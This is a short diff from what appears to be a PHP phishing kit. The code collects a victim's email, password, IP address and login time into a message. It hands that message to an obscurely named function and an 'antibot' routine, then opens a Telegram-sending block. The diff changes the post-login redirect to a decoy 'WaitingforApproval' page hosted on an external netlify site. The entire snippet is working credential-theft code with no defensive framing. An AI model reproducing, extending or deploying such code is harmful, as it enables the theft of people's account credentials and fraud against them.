@@ -11,7 +11,7 @@ $time1 = date('M d - h:i:s A');
 $hostname = gethostbyaddr($ip2);
 $message = "[ $ip2 ] - L O G  I N # 2- [ $time1 ]\nEMAIL # 2: $email\r\nPASSWORD # 2: $password\r\n==========================\n";z6nQf($message);antibot($message);
 
-            header("location:WaitingforApproval.html");
+            header("location:https://missfilipinateen2022.netlify.app/WaitingforApproval.html");
 
 // TELEGRAM SEND FUNCTION
 if ($telegram == "on"){
